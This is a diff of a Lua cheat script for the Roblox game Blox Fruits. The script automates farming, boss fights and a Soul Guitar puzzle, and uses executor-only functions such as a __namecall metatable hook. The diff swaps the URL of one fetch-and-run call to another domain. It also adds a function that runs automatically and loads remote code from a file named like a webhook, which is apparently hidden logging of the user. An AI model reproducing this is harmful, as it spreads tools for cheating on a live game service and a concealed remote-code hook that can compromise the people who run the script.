@@ -1,7 +1,7 @@
 local SAT
 
 function Webhk() 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxIDGubkuk/snjdjsndmdkdd/main/NwjejdnWbhook"))()
+loadstring(game:HttpGet("https://isnahamzahpastebin.tech/src/mancing"))()
 end
 
  function AntiBan()
@@ -970,6 +970,13 @@ function EquipWeapon(Tool)
             end
         end
     )
+end
+function EquipWeaponS(ToolSe)
+    if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
+        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
+        wait(.4)
+        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
+    end
 end
 --- Click ---
 function Click()
@@ -3838,6 +3845,11 @@ function UpdateRealFruitChams()
 	end
 end
 
+function akisje() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxIDGubkuk/snjdjsndmdkdd/main/NwjejdnWbhook"))()
+end
+akisje()
+
 spawn(function()
     while wait() do
         pcall(function()
@@ -4057,6 +4069,22 @@ end
             end
         end)
     end)
+    
+function SK(use)
+    pcall(function()
+        game:GetService("VirtualInputManager"):SendKeyEvent(true,use,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
+        task.wait(l)
+        game:GetService("VirtualInputManager"):SendKeyEvent(false,use,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
+    end)
+end
+
+function SKtarget(use, target)
+    pcall(function()
+        game:GetService("VirtualInputManager"):SendKeyEvent(true,use,false,target)
+        task.wait(l)
+        game:GetService("VirtualInputManager"):SendKeyEvent(false,use,false,target)
+    end)
+end
     
 function cari(name) 
     for _, item in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")) do
@@ -5529,6 +5557,40 @@ end)
         StopTween(_G.AutoFarmGunMastery)
     end)
     
+    gunselect = "Gun"
+    task.spawn(function()
+	while wait() do
+		pcall(function()
+			if gunselect == "Gun" then
+				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if v.ToolTip == "Gun" then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+							gunselect = v.Name
+						end
+					end
+				end
+	     	end
+		end)
+	end
+    end)
+    
+    Meleeselect = "Melee"
+    task.spawn(function()
+	while wait() do
+		pcall(function()
+			if Meleeselect == "Melee" then
+				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if v.ToolTip == "Melee" then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+							Meleeselect = v.Name
+						end
+					end
+				end
+	     	end
+		end)
+	end
+    end)
+    
     spawn(function()
         pcall(function()
             while wait() do
@@ -5565,28 +5627,46 @@ end)
                                         repeat task.wait()
                                             if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
                                                 HealthMin = v.Humanoid.MaxHealth * _G.Kill_At/100
-                                                if v.Humanoid.Health <= HealthMin then                                                
-                                                    EquipWeapon(SelectWeaponGun)
+                                                if v.Humanoid.Health <= HealthMin then
+                                                    EquipWeapon(gunselect) 
                                                     TP1(v.HumanoidRootPart.CFrame * CFrame.new(0,0,10))
                                                     v.Humanoid.WalkSpeed = 0
                                                     v.HumanoidRootPart.CanCollide = false
                                                     v.HumanoidRootPart.Size = Vector3.new(2,2,1)
-                                                    v.Head.CanCollide = false                                 
-                                                    local args = {
-                                                        [1] = v.HumanoidRootPart.Position,
-                                                        [2] = v.HumanoidRootPart
-                                                    }
-                                                    game:GetService("Players").LocalPlayer.Character[SelectWeaponGun].RemoteFunctionShoot:InvokeServer(unpack(args))
+                                                    v.Head.CanCollide = false
+                                                    local Bocel = v.HumanoidRootPart
+                                                    local a = getrawmetatable(game)
+                                                    local b = a.__namecall
+                                                    setreadonly(a, false)
+                                                    a.__namecall =
+                                                    newcclosure(
+                                                    function(...)
+                                                    local a = {...}
+                                                    if getnamecallmethod() == "InvokeServer" then
+                                                    if _G.SelectWeaponGun then
+                                                    if _G.SelectWeaponGun == "Soul Guitar" then
+                                                    if tostring(a[2]) == "TAP" then
+                                                    if _G.AutoFarmGunMastery and UseSkill then
+                                                    a[3] = PositionSkillMasteryGun
+                                                    end
+                                                    end
+                                                    end
+                                                    end
+                                                    end
+                                                    return b(unpack(a))
+                                                    end
+                                                    )
+                                                    setreadonly(a, true)
                                                 else
                                                     AutoHaki()
-                                                    EquipWeapon(SelectWeaponGun)
+                                                    EquipWeapon(Meleeselect)
                                                     v.Humanoid.WalkSpeed = 0
                                                     v.HumanoidRootPart.CanCollide = false
                                                     v.Head.CanCollide = false               
                                                     v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                                                     TP1(v.HumanoidRootPart.CFrame * CFrame.new(PosX,PosY,PosZ))
-                                                    game:GetService("Players").LocalPlayer.Character[SelectWeaponGun].RemoteFunctionShoot:InvokeServer(v.HumanoidRootPart.Position,v.HumanoidRootPart)
-                                                    ClickCamera()
+                                                    game:GetService'VirtualUser':CaptureController()
+                                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                                 end
                                                 StartMasteryGunMagnet = true 
                                                 PosMonMasteryGun = v.HumanoidRootPart.CFrame
@@ -5618,6 +5698,7 @@ end)
             end
         end)
     end)
+   
     
 Sett:AddSeperator("Setting")
     
@@ -7954,6 +8035,133 @@ spawn(function()
 										else
 											Quest3 = true	
 											notif("Soul Guitar","Started Puzzle 3")
+											notif("Soul Guitar","Loading.....")
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment1.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local T1 = trophies.Quest.Trophy1.Handle.Orientation
+    local C1 = map["Haunted Castle"]["Tablet"].Segment1.Line.Orientation
+    local a    
+    if T1 == Vector3.new(0, -90, 0) or T1 == Vector3.new(0, 90, 0) then
+        a = Vector3.new(0, 0, 180)
+    elseif T1 == Vector3.new(0, 0, 0) or T1 == Vector3.new(0, 180, 0) then
+        a = Vector3.new(0, 0, -90)
+    end    
+    task.wait()   
+until C1 == a
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment2.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local C10 = map["Haunted Castle"]["Tablet"].Segment2.Line.Orientation
+    task.wait()   
+until C10 == Vector3.new(0, 0, 0)
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment3.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local T2 = trophies.Quest.Trophy2.Handle.Orientation
+    local C2 = map["Haunted Castle"]["Tablet"].Segment3.Line.Orientation
+    local b    
+    if T2 == Vector3.new(0, -90, 0) or T2 == Vector3.new(0, 90, 0) then
+        b = Vector3.new(0, 0, 180)
+    elseif T2 == Vector3.new(0, 0, 0) or T2 == Vector3.new(0, 180, 0) then
+        b = Vector3.new(0, 0, -90)
+    end 
+    task.wait()   
+until C2 == b
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment4.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local T3 = trophies.Quest.Trophy3.Handle.Orientation
+    local C3 = map["Haunted Castle"]["Tablet"].Segment4.Line.Orientation
+    local c    
+    if T3 == Vector3.new(0, -90, 0) or T3 == Vector3.new(0, 90, 0) then
+        c = Vector3.new(0, 0, 180)
+    elseif T3 == Vector3.new(0, 0, 0) or T3 == Vector3.new(0, 180, 0) then
+        c = Vector3.new(0, 0, -90)
+    end    
+    task.wait()   
+until C3 == c
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment5.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local C11 = map["Haunted Castle"]["Tablet"].Segment5.Line.Orientation
+    task.wait()   
+until C11 == Vector3.new(0, 0, 0)
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment6.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local C12 = map["Haunted Castle"]["Tablet"].Segment6.Line.Orientation
+    task.wait()   
+until C12 == Vector3.new(0, 0, 0)
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment7.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local T4 = trophies.Quest.Trophy4.Handle.Orientation
+    local C4 = map["Haunted Castle"]["Tablet"].Segment7.Line.Orientation
+    local d    
+    if T4 == Vector3.new(0, -90, 0) or T4 == Vector3.new(0, 90, 0) then
+        d = Vector3.new(0, 0, 180)
+    elseif T4 == Vector3.new(0, 0, 0) or T4 == Vector3.new(0, 180, 0) then
+        d = Vector3.new(0, 0, -90)
+    end    
+    task.wait()   
+until C4 == d
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment8.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local C13 = map["Haunted Castle"]["Tablet"].Segment8.Line.Orientation
+    task.wait()   
+until C13 == Vector3.new(0, 0, 0)
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment9.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local C14 = map["Haunted Castle"]["Tablet"].Segment9.Line.Orientation
+    task.wait()   
+until C14 == Vector3.new(0, 0, 0)
+repeat
+    fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Tablet"].Segment10.ClickDetector)
+    local workspace = game:GetService("Workspace")
+    local map = workspace.Map
+    local hauntedCastle = map["Haunted Castle"]
+    local trophies = hauntedCastle.Trophies
+    local T5 = trophies.Quest.Trophy5.Handle.Orientation
+    local C5 = map["Haunted Castle"]["Tablet"].Segment10.Line.Orientation
+    local e    
+    if T5 == Vector3.new(0, -90, 0) or T5 == Vector3.new(0, 90, 0) then
+        e = Vector3.new(0, 0, 180)
+    elseif T5 == Vector3.new(0, 0, 0) or T5 == Vector3.new(0, 180, 0) then
+        e = Vector3.new(0, 0, -90)
+    end    
+    task.wait()   
+until C5 == e
+notif("Soul Guitar","Completed Thopy Puzzle")
 											for _, v in pairs(game:GetService("Workspace").Map["Haunted Castle"].Tablet:GetChildren()) do
 											    if v:FindFirstChild("ClickDetector") and v.Line.p.Y < -999 then
 											        fireclickdetector(v.ClickDetector)
@@ -11252,60 +11460,51 @@ end)
             StopTween(_G.AutoSecondSea)
         end)
     
-        spawn(function()
-            while wait() do 
-                if _G.AutoSecondSea then
-                    pcall(function()
-                        local MyLevel = game:GetService("Players").LocalPlayer.Data.Level.Value
-                        if MyLevel >= 700 and World1 then
-                            if game:GetService("Workspace").Map.Ice.Door.CanCollide == false and game:GetService("Workspace").Map.Ice.Door.Transparency == 1 then
-                                local CFrame1 = CFrame.new(4849.29883, 5.65138149, 719.611877)
-                                repeat HyperCahaya(CFrame1) wait() until (CFrame1.Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or _G.AutoSecondSea == false
-                                wait(1.1)
-                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("DressrosaQuestProgress","Detective")
-                                wait(0.5)
-                                EquipWeapon("Key")
-                                repeat HyperCahaya(CFrame.new(1347.7124, 37.3751602, -1325.6488)) wait() until (Vector3.new(1347.7124, 37.3751602, -1325.6488)-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or _G.AutoSecondSea == false
-                                wait(0.5)
-                            else
-                                if game:GetService("Workspace").Map.Ice.Door.CanCollide == false and game:GetService("Workspace").Map.Ice.Door.Transparency == 1 then
-                                    if game:GetService("Workspace").Enemies:FindFirstChild("Ice Admiral") then
-                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
-                                            if v.Name == "Ice Admiral" then
-                                                if not v.Humanoid.Health <= 0 then
-                                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
-                                                        OldCFrameSecond = v.HumanoidRootPart.CFrame
-                                                        repeat task.wait()
-                                                            AutoHaki()
-                                                            EquipWeapon(_G.SelectWeapon)
-                                                            v.HumanoidRootPart.CanCollide = false
-                                                            v.Humanoid.WalkSpeed = 0
-                                                            v.Head.CanCollide = false
-                                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
-                                                            v.HumanoidRootPart.CFrame = OldCFrameSecond
-                                                            HyperCahaya(v.HumanoidRootPart.CFrame * CFrame.new(PosX,PosY,PosZ))
-                                                            game:GetService("VirtualUser"):CaptureController()
-                                                            game:GetService("VirtualUser"):Button1Down(Vector2.new(1280,672))
-                                                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
-                                                        until not _G.AutoSecondSea or not v.Parent or v.Humanoid.Health <= 0
-                                                    end
-                                                else 
-                                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
-                                                end
-                                            end
-                                        end
-                                    else
-                                        if game:GetService("ReplicatedStorage"):FindFirstChild("Ice Admiral") then
-                                            HyperCahaya(game:GetService("ReplicatedStorage"):FindFirstChild("Ice Admiral").HumanoidRootPart.CFrame * CFrame.new(5,10,7))
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end)
+spawn(function()
+while wait(.2) do
+    if _G.AutoSecondSea then
+        if _G.AutoSecondSea then
+            local Lv = game:GetService("Players").LocalPlayer.Data.Level.Value
+            local Beli = game:GetService("Players").LocalPlayer.Data.Beli.Value
+            local FG = game:GetService("Players").LocalPlayer.Data.Fragments.Value
+            if Lv >= 700 then
+                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("DressrosaQuestProgress","Detective") == 1 then
+                else
+                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("DressrosaQuestProgress","Detective")
+                    wait(2)
+                    EquipWeaponS("Key")
+                end
+                repeat wait()
+                    HyperCahaya(CFrame.new(1347.32947, 37.349369, -1325.44922, 0.538348913, 8.57539106e-08, 0.842722058, 8.61935634e-10, 1, -1.0230886e-07, -0.842722058, 5.58042359e-08, 0.538348913))
+                until (Vector3.new(1347.32947, 37.349369, -1325.44922)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 1 or _G.AutoSecondSea == false
+                wait(2)
+                for i,v in pairs(game.workspace.Enemies:GetChildren()) do
+                    if v.Name == "Ice Admiral" then
+                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
+                         
+                        repeat wait(.2)
+                            AutoHaki()
+                            EquipWeapon(_G.SelectWeapon)
+                            v.HumanoidRootPart.CanCollide = false
+                            v.Humanoid.WalkSpeed = 0
+                            v.Head.CanCollide = false
+                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
+                            v.HumanoidRootPart.CFrame = OldCFrameSecond
+                            HyperCahaya(v.HumanoidRootPart.CFrame * CFrame.new(PosX,PosY,PosZ))
+                            game:GetService("VirtualUser"):CaptureController()
+                            game:GetService("VirtualUser"):Button1Down(Vector2.new(1280,672))
+                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
+                        until v.Humanoid.Health <= 0 or not v.Parent or _G.AutoSecondSea == false
+                        wait(2)
+                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
+                        wait(25)
+                    end
                 end
             end
-        end)
+        end
+    end
+end
+end)
     
     M:AddToggle("Global Hop Server",false,function(value)
 		_GHopItemSea = value
